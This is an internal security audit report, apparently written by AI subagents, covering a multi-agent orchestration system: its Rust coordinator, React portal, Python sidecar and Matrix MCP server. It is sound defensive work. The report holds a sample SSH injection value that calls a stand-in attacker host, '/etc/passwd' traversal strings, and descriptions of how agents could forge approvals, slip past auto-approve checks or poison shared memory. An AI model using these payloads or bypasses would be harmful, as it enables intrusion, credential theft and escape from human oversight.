# FCT020 Factory Security Audit — Red-Hat Team Assessment

**Date:** 2026-03-21
**Auditor:** Whitebox Red-Hat Team (9 coordinated subagents)
**Scope:** Full-stack security assessment of Factory/DreamFactory multi-agent orchestration system
**Classification:** INTERNAL — contains vulnerability details
**Reference Architecture:** [paperclipai/paperclip](https://github.com/paperclipai/paperclip)

---

## Executive Summary

Factory is a multi-component orchestration system comprising a Rust coordinator (~11,600 LOC), React portal (Vite+TypeScript), YAML job registry, Matrix integration, and supporting services. Nine specialized subagents performed concurrent audits across secrets management, source code, dependencies, network exposure, and deployment configuration.

**Overall posture: MODERATE RISK.** No hardcoded secrets were found anywhere. The codebase demonstrates strong security awareness (HMAC signing, approval gates, shell metacharacter detection, audit logging). However, several exploitable gaps exist — particularly around API authentication, command injection in the delegate system, and unsigned approval fallbacks — that must be closed before any public release.

### Finding Summary

| Severity | Count | Key Themes |
|----------|-------|------------|
| **CRITICAL** | 4 | Flat allowlist (no RBAC), approval spoofing, MCP SDK data leak, unauthenticated Matrix MCP HTTP |
| **HIGH** | 13 | SSH command injection, unsigned approvals, no portal auth, auto-approve write ops, CSRF, CSP, SSRF via homeserver header, credentials in tool schema |
| **MEDIUM** | 16 | Path traversal, orphan processes, default trust levels, no rate limiting, no room allowlists, glob_match bypass, client cache hijack |
| **LOW** | 12 | cargo-audit missing, unwrap panics, plaintext session IDs, HTML injection, unbounded cache |
| **INFO** | 8 | Good patterns noted, dependency health, network minimalism, coordinator/MCP independence |

---

## 1. Coordinator-rs (Rust Orchestration Binary)

### CRITICAL

#### C1. No Role Differentiation on Slash Commands
**File:** `coordinator/src/coordinator.rs`
**Description:** Slash commands (`/approve`, `/deny`, `/agent recover`, `/delegate`, `/loop start`, `/loop abort`) are gated only by a flat allowlist check (`is_allowlisted`). Any user on the allowlist can approve arbitrary tool calls, recover agents, start delegate sessions, and abort loops. There are no privilege tiers.
**Impact:** Compromise of any allowlisted Matrix account grants full coordinator control, including approving shell commands for execution.
**Recommendation:** Introduce per-command permission levels tied to the trust level system. At minimum, `/approve`, `/deny`, `/agent recover`, `/delegate`, and `/loop` should require an "operator" role.

#### C2. Approval Owner Check — No Cryptographic Verification on Matrix Path
**File:** `coordinator/src/coordinator.rs` (`process_reaction`)
**Description:** Approval decisions via Matrix reactions validate only `event.sender != approval_owner` via string comparison. The HMAC signer exists for filesystem approvals but is **not** used for Matrix reaction-based approvals. A spoofed Matrix event from the `approval_owner` identity could approve arbitrary tool executions.
**Recommendation:** Extend HMAC signing to the Matrix approval flow, or implement challenge-response for approvals.

### HIGH

#### H1. SSH Command Injection via `repo` and `model` Parameters
**File:** `coordinator/src/delegate.rs` (lines 89–101)
**Description:** The relay command is constructed via `format!()`:
```rust
format!("LOOP_SPEC_PATH='{}' ~/dev/scripts/session-relay.sh {} {}", spec_path, repo, model)
```
The `repo` and `model` values come from the `/delegate` slash command (user input from Matrix). The remote shell interprets the entire string, making shell metacharacter injection possible. Example: a `repo` value of `foo; curl attacker.com/exfil` would execute on Cloudkicker.
**Note:** Path traversal validation exists for `loop_spec:` but `repo` and `model` are **not validated or sanitized**.
**Recommendation:** Validate `repo` and `model` against an alphanumeric+hyphen+slash whitelist, or pass them as separate SSH arguments.

#### H2. Unsigned Approval Fallback When HMAC Signer Unavailable
**File:** `coordinator/src/coordinator.rs`
**Description:** When `hmac_signer` is `None`, approval responses are written as plain text (`"allow"` or `"deny"`) without any signature. Code comment: "No HMAC signer — write unsigned response (hook will accept without sig)." Any process with write access to `~/.config/ig88/approvals/` can forge approval responses.
**Impact:** Local privilege escalation — any agent or process on Blackbox can approve its own tool calls.
**Recommendation:** Make the HMAC signer mandatory. Fail closed (deny) if the signer cannot be loaded.

#### H3. Auto-Approve List Includes Matrix Write Operations
**File:** `coordinator/src/coordinator.rs`
**Description:** `AUTO_APPROVE_TOOLS` includes `mcp__matrix-boot__send-message`, `mcp__matrix-boot__send-direct-message`, and `mcp__matrix-boot__send-reaction`. These are write operations allowing agents to impersonate the boot user in Matrix rooms without approval.
**Impact:** A compromised or misbehaving agent can send messages as the boot user, potentially social-engineering other systems or users.
**Recommendation:** Remove Matrix send/reaction tools from auto-approve, or gate behind trust level >= L3.

#### H4. `mcp__graphiti__add_memory` Auto-Approved — Memory Poisoning
**File:** `coordinator/src/coordinator.rs`
**Description:** `add_memory` is auto-approved. Any agent can inject false facts into the shared Graphiti knowledge graph, poisoning the knowledge base for all agents.
**Recommendation:** Remove from auto-approve or restrict to L3+ trust level.

#### H5. Delegate Auto-Approves Edit/Write Without Path Validation
**File:** `coordinator/src/delegate.rs` (lines 315–318)
**Description:** Delegate auto-approval unconditionally approves `Edit` and `Write` tools with no path validation. The delegate can write to any file accessible to the SSH user on Cloudkicker.
**Recommendation:** Validate that file paths in `Edit`/`Write` tool input are within the delegate's working directory.

### MEDIUM

#### M1. Path Traversal in Loop Spec Loading
**File:** `coordinator/src/coordinator.rs`
**Description:** `/loop start <spec-path>` passes the user-provided path directly to `LoopSpec::load()` without path validation. An attacker could load `../../etc/passwd` or a malicious loop spec from an unexpected location.
**Recommendation:** Restrict loop spec paths to a configured directory.

#### M2. `kill_on_drop: false` for Agent Subprocesses
**File:** `coordinator/src/agent.rs`
**Description:** Agent Claude subprocesses use `.kill_on_drop(false)`. If the coordinator crashes, agent subprocesses become orphans running unsupervised — executing tool calls without approval oversight. (Delegate sessions correctly use `kill_on_drop(true)`.)
**Recommendation:** Change to `kill_on_drop(true)` or implement a process group supervisor.

#### M3. Trust Level Defaults to L2 When Unconfigured
**File:** `coordinator/src/coordinator.rs`
**Description:** When `trust_level` is `None`, it defaults to `2` (L2_ADVISOR). Combined with auto-approve patterns, an unconfigured agent silently gets more access than intended.
**Recommendation:** Require explicit trust level in config. Fail startup if any agent lacks a `trust_level` setting.

#### M4. Sync Token File — Default Permissions
**File:** `coordinator/src/matrix.rs`
**Description:** `~/.config/ig88/sync-tokens.json` is written with default file permissions. Sync tokens could leak room IDs and activity patterns.
**Recommendation:** Write with mode `0600`.

#### M5. No Rate Limiting on Slash Commands
**File:** `coordinator/src/coordinator.rs`
**Description:** Tool approval requests are rate-limited (5/minute), but slash commands have no rate limiting. Spam of `/delegate` could launch unlimited sessions.
**Recommendation:** Add rate limiting to slash commands.

#### M6. Coordinator Fallback to Hardcoded User ID
**File:** `coordinator/src/coordinator.rs`
**Description:** When `coord_user_id` resolution fails, the code falls back to `"@coord:matrix.org"`. If `whoami()` fails but the token is valid for a different user, the coordinator operates with a mismatched identity.
**Recommendation:** Fail startup if `whoami()` fails.

### LOW

- **L1.** No `unsafe` code — eliminates memory safety vulnerabilities.
- **L2.** `cargo-audit` not installed — no automated dependency vulnerability scanning.
- **L3.** Generous `unwrap()` usage in production code — panics crash all agent supervision.
- **L4.** No TLS between coordinator and Pantalaimon (acceptable: both on localhost).
- **L5.** Infrastructure health checks use relative command paths (`docker`, `systemctl`) — PATH manipulation risk.
- **L6.** Agent session IDs persisted in plaintext without restricted permissions.

### INFO (Good Patterns)

- Shell metacharacter detection blocks auto-approval of dangerous commands
- HMAC signing for filesystem approval responses (when signer is available)
- Approval rate limiting (5/minute per agent)
- Approval timeout sweep (auto-deny after configurable timeout)
- Frozen harness enforcement prevents loop agents from modifying test files
- Circuit breaker pattern prevents runaway agents
- Identity drift detection alerts on unauthorized system prompt changes
- Inter-agent routing hop limit (8) prevents infinite loops
- Output dedup prevents relay loops
- 10MB media download guard
- Audit log with restricted permissions (0700 dir, 0600 file)
- Response truncation at 30KB

---

## 2. Portal (React/Vite/TypeScript)

### HIGH

#### H6. No Authentication on API Calls
**File:** `portal/src/lib/api.ts`
**Description:** The `fetchJson()` wrapper sends no authentication tokens, cookies, or authorization headers. Every API endpoint — including state-changing POST operations (`/approvals/*/decide`, `/runs/*/cancel`, `/agents/*/pause`, `/loops/start`, `/loops/*/abort`, `/approvals/budget-override`) — is called with bare `fetch()`.
**Note:** The Caddy reverse proxy enforces HTTP Basic Auth on all routes, so this is mitigated at the network layer. However, the GSD sidecar (server.py) on port 41911/41935 has **no authentication at all** — if directly reachable, any caller can PUT arbitrary JSON to `tasks.json` or `jobs.json`.
**Recommendation:** Add authentication to the GSD sidecar. Consider token-based auth on API calls independent of the reverse proxy.

#### H7. No CSRF Protection on Mutations
**File:** `portal/src/lib/api.ts`
**Description:** POST requests to mutating endpoints include `Content-Type: application/json` but no CSRF token. JSON content type provides partial protection, but a CORS misconfiguration on the backend would expose all mutations.
**Recommendation:** Add CSRF tokens to all state-changing requests. Use `SameSite=Strict` cookies if cookie-based auth is adopted.

#### H8. No Content Security Policy (CSP)
**Description:** No CSP headers are set via HTML meta tags or the Caddy configuration. The app loads an external Google Fonts stylesheet (`https://fonts.googleapis.com`) which would need allowlisting.
**Recommendation:** Add CSP headers via Caddy. Suggested policy:
```
default-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self'; connect-src 'self'; img-src 'self' data:;
```

### MEDIUM

#### M7. No Clickjacking Protection
**Description:** No `X-Frame-Options` or CSP `frame-ancestors` directive is set. The portal can be embedded in an iframe for clickjacking attacks on approval/loop interfaces.
**Recommendation:** Set `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` via Caddy.

#### M8. External CSS Without Subresource Integrity
**File:** `portal/src/styles/app.css`
**Description:** `@import url("https://fonts.googleapis.com/...")` loads an external stylesheet without SRI. A compromised CDN could inject malicious CSS.
**Recommendation:** Self-host the Inter font or add SRI hashes.

#### M9. API Responses Parsed Without Runtime Validation
**File:** `portal/src/lib/api.ts`, `portal/src/components/CommandPalette.tsx`
**Description:** `response.json()` is cast directly to typed interfaces via `as Promise<T>`. No runtime validation (Zod, io-ts). A compromised backend could inject unexpected data shapes.
**Recommendation:** Add runtime schema validation for API responses.

### POSITIVE

- **Zero XSS vectors** — no `dangerouslySetInnerHTML`, `innerHTML`, `eval`, or `Function()` constructor usage
- **Zero hardcoded secrets** in client bundle — no `VITE_*` env vars in `src/`
- **Zero vulnerable dependencies** — `pnpm audit` returned clean
- All navigation URLs are hardcoded or template-constrained (no open redirect risk)

---

## 3. GSD Sidecar (server.py) — Portal Data Backend

### HIGH (included in H6 above)

#### H6a. GSD Sidecar Has No Authentication
**File:** `portal/server.py`
**Description:** The Python HTTP server accepts PUT requests to write `tasks.json`, `jobs.json`, and `status/*.json` with **no authentication**. It relies entirely on network isolation (binding to `127.0.0.1`) and the Caddy reverse proxy for access control.
**Risk:** If the sidecar port (41911/41935) is reachable from any process on the host — including a compromised agent — arbitrary job/task data can be injected.

### MEDIUM

#### M10. Path Traversal Protection is Partial
**File:** `portal/server.py` (`_is_allowed_write_path`)
**Description:** The write path validation checks for `..` in the request path but does not normalize the path first. URL-encoded traversal sequences (`%2e%2e`) or double-encoded variants could bypass the check (though Python's HTTP server may normalize these — verify).
**Recommendation:** Use `pathlib.Path.resolve()` and verify the resolved path starts with `DATA_ROOT`.

### POSITIVE

- 1MB payload size limit on PUT requests
- JSON validation before write (rejects non-JSON payloads)
- Explicit allowlist of writable paths (`tasks.json`, `jobs.json`, `status/*.json`)
- Binds to `127.0.0.1` by default

---

## 4. Network & Deployment

### Findings

#### N1. Portal Caddy Uses HTTP, Not HTTPS (MEDIUM)
**File:** `portal/serve.sh` (Caddyfile generation)
**Description:** The generated Caddyfile binds to `http://${HOST}:${PORT}` — plain HTTP. Basic Auth credentials are transmitted in cleartext over the network. On Tailscale this is acceptable (WireGuard encryption at the tunnel layer), but if the portal is ever exposed beyond Tailscale, credentials are sniffable.
**Recommendation:** Add TLS termination in Caddy for any non-Tailscale deployment. Document the Tailscale-as-TLS assumption explicitly.

#### N2. Bcrypt Hash in Caddyfile (LOW)
**File:** `portal/serve.sh`, `explainers/Caddyfile`
**Description:** Bcrypt password hashes are embedded directly in generated Caddyfiles. While bcrypt hashes are computationally expensive to reverse, they should still be treated as sensitive. The Caddyfile is not gitignored (it's generated at runtime and cleaned up, but the explainers Caddyfile is committed).
**Recommendation:** Ensure generated Caddyfiles are gitignored. Consider using Caddy's environment variable substitution for password hashes.

#### N3. Cloudkicker Network Exposure — Minimal (INFO)
**Description:** Only port 41934 (dev preview slot) is listening on Cloudkicker. No Factory production services are exposed. Tailscale is active. The portal runs on Blackbox (RP5).

#### N4. Systemd Services Run as `nesbitt` User (INFO)
**Description:** Both `factory-portal.service` and `gsd-backend.service` run as user `nesbitt` on Blackbox. This is the same user that owns the coordinator and agent processes. No privilege separation between services.
**Recommendation:** Consider separate service accounts for the portal vs. coordinator for defense-in-depth.

#### N5. `make nuke` Exists — Destructive One-Liner (LOW)
**File:** `portal/Makefile` (line 94)
**Description:** `make nuke` stops, disables, and deletes both systemd services in one command. While this is a legitimate admin tool, it has no confirmation prompt.
**Recommendation:** Add a confirmation prompt or require an environment variable flag.

---

## 5. Matrix MCP Server (`~/dev/matrix-mcp/`)

The matrix-mcp server bridges Claude Code agents to Matrix rooms via the Model Context Protocol. It exposes 22 tools in two tiers (14 read-only, 8 write/action) and supports HTTP and stdio transports. ~1,800 LOC across 20 TypeScript source files.

**Note:** The coordinator-rs has its own independent Rust Matrix client via Pantalaimon — it does NOT route through matrix-mcp. These are architecturally separate systems with distinct attack surfaces.

### CRITICAL

#### C3. MCP SDK Cross-Client Data Leak
**File:** `matrix-mcp/src/route-handlers.ts`
**Advisory:** GHSA-345p-7cg4-v4c7
**Description:** The `handlePost` handler calls `server.connect(transport)` on every request using the same global `McpServer` singleton. `@modelcontextprotocol/sdk` versions 1.10.0–1.25.3 have a confirmed cross-client data leak via shared server/transport instance reuse. If two HTTP requests arrive concurrently, one client's auth context, Matrix credentials, or response data could leak to another.
**Impact:** Credential exfiltration, cross-agent data leakage, session hijacking.
**Recommendation:** Upgrade `@modelcontextprotocol/sdk` to >= 1.26.0. Alternatively, create a new `McpServer` instance per request.

#### C4. HTTP Mode Has Zero Authentication When OAuth Disabled
**File:** `matrix-mcp/src/http-server.ts`
**Description:** When `ENABLE_OAUTH` is `false` (the default in `.env.example`), the `/mcp` route has zero authentication middleware. Anyone who can reach the HTTP port can invoke all 22 tools, including write operations (`send-message`, `create-room`, `set-account-data`). Combined with the default `LISTEN_HOST=0.0.0.0`, this exposes full unauthenticated Matrix control to the entire network.
**Mitigation:** Tailscale limits network exposure on the current deployment, but defense-in-depth requires application-layer auth.
**Recommendation:** Add mandatory authentication in non-OAuth mode (shared secret header, mTLS, or bind to `127.0.0.1` only). Default `LISTEN_HOST` to `127.0.0.1`.

### HIGH

#### H9. SSRF + Credential Exfiltration via Caller-Controlled Homeserver URL
**Files:** `matrix-mcp/src/utils/server-helpers.ts` (`getMatrixContext()`), `matrix-mcp/src/tools/tier1/messaging.ts` (lines 99–122)
**Description:** `homeserverUrl` is read from request headers (`matrix_homeserver_url`). In HTTP mode without OAuth, an attacker can set this to an arbitrary URL. The Pantalaimon fallback in `send-message` makes a raw `fetch()` to this URL with the bot's access token in an Authorization header. An attacker can direct the server to send the legitimate bot's credentials to an attacker-controlled server.
**Impact:** Credential exfiltration, SSRF to internal services.
**Recommendation:** Validate `homeserverUrl` against an allowlist of permitted homeserver URLs. In non-OAuth mode, ignore header-supplied values entirely.

#### H10. Matrix Credentials Exposed in MCP Tool Input Schema
**File:** `matrix-mcp/src/schemas/toolSchemas.ts`
**Description:** The base schema defines `matrixAccessToken` as a tool input parameter. While handlers extract credentials from headers/env, the schema declares them as tool inputs. MCP middleware, monitoring, or logging that captures tool invocations will record credentials in plaintext.
**Recommendation:** Remove `matrixAccessToken` from tool input schemas entirely. Credentials should only flow via headers or environment variables.

#### H11. Default HTTP Listen on 0.0.0.0
**File:** `matrix-mcp/src/http-server.ts`
**Description:** `LISTEN_HOST` defaults to `0.0.0.0`, binding to all interfaces. Combined with C4, this exposes the unauthenticated MCP endpoint to the entire network.
**Recommendation:** Default to `127.0.0.1`.

#### H12. 5 High-Severity npm Vulnerabilities
**Source:** `npm audit`
**Findings:**
- `@hono/node-server` < 1.19.10 — Authorization bypass via encoded slashes (GHSA-wc8c-qw6v-h7f6)
- `@modelcontextprotocol/sdk` 1.10.0–1.25.3 — Cross-client data leak (GHSA-345p-7cg4-v4c7)
- `flatted` <= 3.4.1 — Prototype pollution + unbounded recursion DoS
- `hono` — 5 vulnerabilities including timing attacks on auth, prototype pollution, arbitrary file access
- `minimatch` — Multiple ReDoS
**Recommendation:** Run `npm audit fix` immediately.

### MEDIUM

#### M11. No Rate Limiting on MCP Tool Invocations
**Description:** No rate limiting at the MCP server level. Matrix homeservers have their own rate limiting, but the MCP server will forward unlimited requests. A runaway agent could flood Matrix rooms.
**Recommendation:** Add rate limiting middleware.

#### M12. No Room/Agent Allowlist
**Description:** Any caller who can reach the MCP endpoint can operate on any room the bot user has access to. No mechanism restricts which rooms an agent can read/write or which users it can DM.
**Recommendation:** Implement a room allowlist per agent identity.

#### M13. Client Cache Hijack — No Token Binding
**File:** `matrix-mcp/src/matrix/clientCache.ts`
**Description:** Cache key is `${userId}:${homeserverUrl}` without including the access token. If attacker A creates a client for `@bot:example.com`, legitimate user B gets A's cached client (or vice versa).
**Recommendation:** Include an access token hash in the cache key, or disable caching in multi-user HTTP mode.

#### M14. TLS Verification Disabled When `ALLOW_SELF_SIGNED_CERTS=true`
**Files:** `tokenExchange.ts`, `verifyAccessToken.ts`, `client.ts`
**Description:** TLS verification is disabled when this env var is set. The guard `NODE_ENV !== 'production'` is ineffective because `NODE_ENV` defaults to undefined.
**Recommendation:** Default `NODE_ENV` to `production` in startup, or require an additional explicit flag.

#### M15. `set-account-data` Allows Arbitrary Type Overwrites
**File:** `matrix-mcp/src/tools/tier1/account-data.ts`
**Description:** Accepts any `type` string and any JSON content. An agent could overwrite critical Matrix account data like `m.direct`, `m.push_rules`, etc.
**Recommendation:** Block writes to `m.*` types. Implement a prefix allowlist.

#### M16. `glob_match` Bypassable for Path-Based Auto-Approve
**File:** `coordinator/src/coordinator.rs`
**Description:** The coordinator's `glob_match` function with pattern `"cat ~/dev/*"` will match `cat ~/dev/../../etc/passwd` because it only checks `starts_with(prefix)` and `ends_with(suffix)`. The shell metacharacter regex partially mitigates this, but `../` traversal in `cat`/`head` commands passes auto-approval.
**Recommendation:** Add `..` to the metacharacter deny regex, or normalize paths before matching.

### LOW

#### L7. Error Messages May Leak Internal State
**Description:** Error messages include raw `error.message` which may contain homeserver URLs, internal paths, or stack traces.

#### L8. No HTML Sanitization for HTML Messages
**File:** `matrix-mcp/src/tools/tier1/messaging.ts`
**Description:** When `messageType === "html"`, raw user-supplied content is passed directly to `client.sendHtmlMessage()`. Could allow HTML injection into Matrix rooms (though Matrix clients generally sanitize on receipt).

#### L9. Client Cache Has No Maximum Size
**File:** `matrix-mcp/src/matrix/clientCache.ts`
**Description:** Cache grows unbounded. Each cached `MatrixClient` maintains a persistent sync connection.

#### L10. No Test Suite
**Description:** `jest` is in devDependencies but no test files exist. Security-critical code has no automated test coverage.

#### L11. Matrix Token Storage
**Description:** Matrix access tokens stored in files referenced by `token_file` in agent config. File permissions should be `0600` — verify on Blackbox.

---

## 6. Job System & YAML Configuration

### MEDIUM

#### M12. YAML Deserialization — Safe
**Description:** The coordinator uses `serde_yaml` (Rust) which does not support YAML tags or arbitrary code execution. The Python build script uses `yaml.safe_load()`. **No YAML injection risk.**

### LOW

#### L7. Job YAML Files Are Trusted Input
**Description:** Job YAML files are committed to git and built via `build-jobs-json.py`. They are not user-supplied at runtime. The build script reads YAML, validates schema, and emits JSON. No injection vector exists in the current architecture.

---

## 7. Secrets Management

### CLEAN

**No hardcoded secrets found anywhere in the codebase.**

- All API keys use environment variable references or placeholders (`...`, `"your-key"`)
- `.env` files are properly gitignored across all repos
- `.env.example` files contain only placeholder values
- Git history shows no accidentally committed secrets
- No `.pem`, `.key`, or credential files tracked by git
- Bitwarden integration in progress (Cloudkicker migrated; Blackbox uses age encryption)

### Recommendations

1. **Complete Bitwarden migration for Blackbox** — having two secret storage backends (Bitwarden + age) creates inconsistent rotation and audit gaps.
2. **Document secret rotation procedures** — the `credential-rotation-guide.html` page exists in the portal; ensure it covers all services.
3. **Audit Graphiti token rotation** — the `graphiti_token_env` pattern is good (env var indirection), but verify the token is rotated periodically.

---

## 8. Ancillary Repos

### Findings

- **explainers/.env** — Exists, contains only `EXPLAINERS_USER` and `EXPLAINERS_PASSWORD_HASH`. Properly gitignored, not tracked by git. **No risk.**
- **blackbox/** — Contains an older copy of `coordinator-rs` in `src/coordinator-rs/`. Build artifacts (`.rlib`, `.rmeta`) are present in the target directory. These are compiled Rust libraries, not source code. **Low risk** but unnecessary duplication.
- **get-shit-done/** — The GSD `server.py` serves as the sidecar for Factory's portal. Security findings covered in Section 3 above.
- **whitebox/** — Configuration/setup repo. No `.env` files. No secrets detected.
- **Cross-contamination:** References to Factory exist in blackbox docs (migration checklists, secrets architecture). These are documentation only — no shared runtime config or credentials.

---

## 9. Paperclip Comparison — Security Patterns Factory Should Adopt

Based on analysis of [paperclipai/paperclip](https://github.com/paperclipai/paperclip), the following patterns are recommended for Factory's public release:

| Pattern | Paperclip | Factory Current | Gap |
|---------|-----------|-----------------|-----|
| **API Key Auth** | Bearer tokens, hashed at rest, per-agent key management | Matrix allowlist only | **CRITICAL** — need API key infrastructure |
| **Multi-tenant isolation** | `company_id` scoping on all entities, enforced at every route | Single-tenant (personal use) | Required for public release |
| **Secrets service** | Pluggable providers, audit trail, rotation support | Bitwarden + age (manual) | Need programmatic secrets API |
| **RBAC** | Per-permission authorization checks | Flat allowlist, trust levels exist but not enforced on commands | **HIGH** — need role→command mapping |
| **Configuration versioning** | Full JSONB snapshots with rollback | YAML files in git | Adequate for current use; needs versioning API for public |
| **Activity audit log** | Actor type/ID, action, entity, sanitized metadata | Coordinator audit log exists with restricted permissions | Good foundation; extend to portal/sidecar |
| **Budget enforcement** | Monthly budgets per agent, heartbeat enforcement | Budget module exists in coordinator | Verify enforcement is active |
| **Container sandboxing** | `cap_drop: ALL`, `no-new-privileges`, tmpfs isolation | No Docker/container isolation | Required for untrusted agent code execution |
| **Rate limiting** | Not visible (gap in Paperclip too) | Approval rate limiting exists (5/min), no command rate limiting | Extend to all endpoints |

---

## 10. Prioritized Remediation Plan

### Immediate (Before Next Deploy)

| # | Finding | Action | Effort |
|---|---------|--------|--------|
| 1 | C3 | Upgrade `@modelcontextprotocol/sdk` in matrix-mcp to >= 1.26.0 | 15min |
| 2 | C4/H11 | Default matrix-mcp `LISTEN_HOST` to `127.0.0.1`; add auth for non-OAuth mode | 2h |
| 3 | H1 | Sanitize `repo`/`model` in delegate SSH command — whitelist validation | 1h |
| 4 | H2 | Make HMAC signer mandatory — fail closed on missing signer | 2h |
| 5 | H12 | Run `npm audit fix` on matrix-mcp (all 5 high-severity vulns) | 15min |
| 6 | H3/H4 | Remove Matrix send tools and `add_memory` from auto-approve list | 30min |
| 7 | H9 | Validate `homeserverUrl` against allowlist; ignore headers in non-OAuth mode | 1h |
| 8 | H10 | Remove `matrixAccessToken` from MCP tool input schemas | 30min |

### Short-Term (Next Sprint)

| # | Finding | Action | Effort |
|---|---------|--------|--------|
| 9 | C1 | Implement per-command RBAC on slash commands | 1d |
| 10 | C2 | Extend HMAC verification to Matrix approval path | 1d |
| 11 | H5 | Add path validation to delegate Edit/Write auto-approve | 2h |
| 12 | H6/H6a | Add authentication to GSD sidecar | 4h |
| 13 | H8 | Add CSP + clickjacking headers to Caddy config | 2h |
| 14 | M2 | Change agent subprocesses to `kill_on_drop(true)` | 30min |
| 15 | M3 | Require explicit trust level in agent config | 1h |
| 16 | M12 | Implement room/agent allowlist in matrix-mcp | 4h |
| 17 | M13 | Include access token hash in matrix-mcp client cache key | 1h |
| 18 | M15 | Block `m.*` type writes in `set-account-data` | 1h |
| 19 | M16 | Add `..` to coordinator glob_match deny regex | 30min |
| 20 | L2 | Install `cargo-audit` and integrate into CI | 30min |

### Pre-Public-Release

| # | Finding | Action | Effort |
|---|---------|--------|--------|
| 13 | — | Implement API key authentication (per Paperclip pattern) | 3d |
| 14 | — | Add multi-tenant `company_id` scoping | 5d |
| 15 | — | Programmatic secrets management service | 3d |
| 16 | — | Container sandboxing for untrusted agent execution | 2d |
| 17 | — | Configuration versioning with rollback API | 2d |
| 18 | — | Comprehensive activity audit logging across all services | 2d |
| 19 | N1 | TLS termination for non-Tailscale deployments | 4h |
| 20 | H7 | CSRF token implementation | 4h |

---

## Appendix A: Audit Methodology

Nine specialized subagents operated concurrently:

1. **recon-structure** — Codebase layout, tech stack, entry points
2. **recon-paperclip** — Reference architecture analysis (paperclipai/paperclip)
3. **recon-ancillary** — Cross-contamination scan of blackbox, explainers, get-shit-done, whitebox
4. **redhat-secrets** — Hardcoded secrets, git history, base64 patterns, .env tracking
5. **redhat-coordinator** — Rust source audit (17 modules, ~11,600 LOC)
6. **redhat-portal** — React/Vite frontend audit (50 source files)
7. **redhat-jobs** — YAML job system, agent configs, build scripts
8. **redhat-network** — Network exposure, Caddy config, deploy scripts, Tailscale boundary
9. **redhat-matrix** — Matrix MCP integration, token handling, dependency audit

Additional direct scans performed by the coordinating agent for network recon, Caddyfile analysis, and serve.sh review.

## Appendix B: Files Audited

- `coordinator/src/*.rs` — 17 Rust modules
- `portal/src/**/*.{ts,tsx}` — 50 TypeScript/React files
- `portal/server.py`, `portal/serve.sh`, `portal/Makefile`
- `jobs/registry.yaml`, representative job YAML files
- `scripts/build-jobs-json.py`
- `explainers/Caddyfile`
- `matrix-mcp/` — full source tree + npm audit
- `.env`, `.env.example` files across all repos
- `.gitignore` files across all repos
- Git history for deleted sensitive files
- `package.json`, `Cargo.toml`, `pyproject.toml` dependency manifests

---

*This report was generated by a coordinated red-hat team assessment using 9 parallel subagents. Findings are based on static analysis, configuration review, dependency auditing, and architectural assessment. No active exploitation was performed.*

*Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>*
